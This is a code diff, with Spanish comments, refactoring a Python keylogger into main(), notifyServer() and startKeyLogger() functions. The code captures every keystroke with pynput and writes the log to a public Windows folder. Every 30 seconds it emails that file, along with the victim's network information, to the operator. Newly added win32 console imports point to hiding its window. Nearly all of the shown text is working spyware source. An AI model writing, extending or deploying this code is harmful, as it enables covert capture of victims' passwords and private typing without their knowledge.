@@ -1,4 +1,4 @@
-import pynput.keyboard
+import pynput.keyboard,win32console,win32gui
 import os as sistema
 import sys
 import correo
@@ -7,20 +7,23 @@ from threading import Timer
 
 
 EMAIL_DELAY = 30.0
-PATH_TO_FILE ="C:/Users/Public/Music/tmp.txt"
+PATH_TO_FILE = "C:/Users/Public/tmp.txt" 
 
-
+#Send Email
 def send_email(net_info):
-    correo.send(net_info)
+    correo.send(net_info,PATH_TO_FILE)
     timer = Timer(EMAIL_DELAY,send_email,args=[net_info])
     timer.daemon = True
     timer.start()
 
+
+#Conectar el stream output al archivo
 def attach_stdout():
-    return open(PATH_TO_FILE, "+a") if sistema.path.isfile(PATH_TO_FILE) else open(PATH_TO_FILE, "w")
+    sys.stdout = open(PATH_TO_FILE, "+a") if sistema.path.isfile(PATH_TO_FILE) else open(PATH_TO_FILE, "w")
 
 lista=[]
 cadena=""
+#Logica del Keylogger
 def capturar(key):
     global lista, cadena
     key1= convertir(key)
@@ -84,16 +87,28 @@ def erasecharac(key):
     else:
         return key   
 
-user_info = info.get_net_info()
-sys.stdout = attach_stdout()
-timer = Timer(EMAIL_DELAY,send_email,args=[user_info])
-timer.daemon = True
-timer.start()
-listener = pynput.keyboard.Listener(on_release=capturar)
-listener.daemon = True
-listener.start()
+def notifyServer(user_info):
+    timer = Timer(EMAIL_DELAY,send_email,args=[user_info])
+    timer.daemon = True
+    timer.start()
 
-while True:
-    pass
+def startKeyLogger():
+    listener = pynput.keyboard.Listener(on_release=capturar)
+    listener.daemon = True
+    listener.start()
+
+def main():
+    user_info = info.get_net_info()
+    attach_stdout()
+    notifyServer(user_info)
+    startKeyLogger()
+    while True:
+        pass
+
+if __name__ == "__main__":
+    main()
+
+
+
 
 
